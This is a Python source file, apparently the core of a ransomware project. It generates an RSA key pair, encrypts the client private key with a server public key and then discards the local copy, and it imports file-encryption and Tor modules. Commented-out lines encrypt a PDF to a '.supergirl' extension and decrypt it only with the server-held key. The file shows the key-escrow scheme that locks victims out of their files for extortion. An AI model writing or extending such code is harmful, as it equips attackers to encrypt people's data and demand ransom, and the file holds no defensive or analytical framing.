from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend
from RSA.RSAKeyGen import RSAKeyGen
import base64
from Helper import Helper
from FileCrypter import FileCrypter
from TorManager import TorManager

global _helper
_helper = Helper()

def init():
    genKeyPair()


def genKeyPair():
    keys = RSAKeyGen()
    _helper.info("Keys generated!")
    cipher_cpriv_key = base64.b64encode(encryptClientPrivKey(keys.getPrivateKeyAsStr()))

    #writeFile('client.private.enc.key', cipher_cpriv_key.decode('utf-8'))


    #with open("serverkeys/private.key", "rb") as server_p:
      #  server_priv_key = serialization.load_pem_private_key(
      #      server_p.read(),
     #       password=None,
     #       backend=default_backend()
     #   )
    #clear_key = decryptCPriv(server_priv_key, "client.private.enc.key")

    #fC = FileCrypter()
    #fC.encrypt_file("info4.pdf", keys.getPublicKeyAsStr())
    #time.sleep(40)
    #fC.decrypt_file("info4.pdf.supergirl", clear_key.decode('utf-8'))

    keys.forgetPrivate()

def encryptClientPrivKey(priv_key):
    """Encrypt the Clients private key (given as a str) with the servers public key"""
    with open(_helper.path('./server.public.key'), "rb") as key_file:
        public_key = serialization.load_ssh_public_key(
            key_file.read(),
            backend=default_backend()
        )
        key_file.close()

    cipher = public_key.encrypt(
        bytes(priv_key, 'utf-8'),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA1(),
            label=None
        )
    )
    _helper.info("Private Client Key is encrypted")
    return cipher


def decryptCPriv(server_priv, client_private_enc_key_filename):
    """Decrypts the clients private key with the servers private key"""
    with open(client_private_enc_key_filename, 'rb') as x:
        to_encrypt = x.read()
        x.close()
    to_encrypt = to_encrypt.decode('utf-8')
    to_encrypt = base64.b64decode(to_encrypt)
    to_encrypt = bytes(to_encrypt)

    clear_key = server_priv.decrypt(
        to_encrypt,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA1(),
            label=None
        )
    )
    return clear_key

if __name__ == "__main__":
    _helper.info("Program started")
    t = TorManager()
    #t.startProxy()
    #init()
